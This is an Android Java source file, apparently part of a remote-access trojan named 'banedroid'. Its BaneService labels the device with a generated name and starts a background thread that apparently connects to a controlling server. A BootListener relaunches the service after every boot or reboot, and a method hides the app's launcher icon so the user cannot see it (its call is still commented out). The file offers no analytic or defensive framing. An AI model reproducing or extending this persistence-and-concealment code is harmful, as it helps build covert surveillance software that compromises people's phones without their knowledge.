package com.example.banedroid.bane;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.IBinder;
import androidx.annotation.RequiresApi;
import com.example.banedroid.MainActivity;
import com.example.banedroid.connection.ConnectionInitializer;
import com.example.banedroid.storage.Storage;
import com.example.banedroid.storage.StorageException;
import java.util.Date;
import java.util.Objects;

// TODO: diableLauncherIcon
public class BaneService extends Service {

    public static Context context;

    public void onCreate() {
        super.onCreate();
        context = this;
        Storage storage = new Storage(this);
        String name = "Unknown " + new Date();
        if(!storage.isStored("name"))
            storage.set("name",name);
        else
            name = storage.get("name",name);
        new Thread(new ConnectionInitializer(name)).start();
        //disableLauncherIcon();
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    private boolean isLauncherIconVisible() {
        int enabledSetting = getPackageManager().getComponentEnabledSetting(new ComponentName("com.example.banedroid", "com.example.banedroid.Launcher"));
        return enabledSetting != PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
    }

    private void disableLauncherIcon(){
        if(isLauncherIconVisible()){
            try{
                PackageManager p = getPackageManager();
                p.setComponentEnabledSetting(MainActivity.compName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            }catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

}

class BootListener extends BroadcastReceiver {

    @RequiresApi(api = 19)
    public void onReceive(Context context, Intent intent) {
        boolean boot = Objects.equals(intent.getAction(), "android.intent.action.BOOT_COMPLETED") ||
                Objects.equals(intent.getAction(), "android.intent.action.QUICKBOOT_POWERON") ||
                Objects.equals(intent.getAction(), "android.intent.action.REBOOT");
        if (boot) {
            Intent i = new Intent(context, BaneService.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startService(i);
        }
    }

}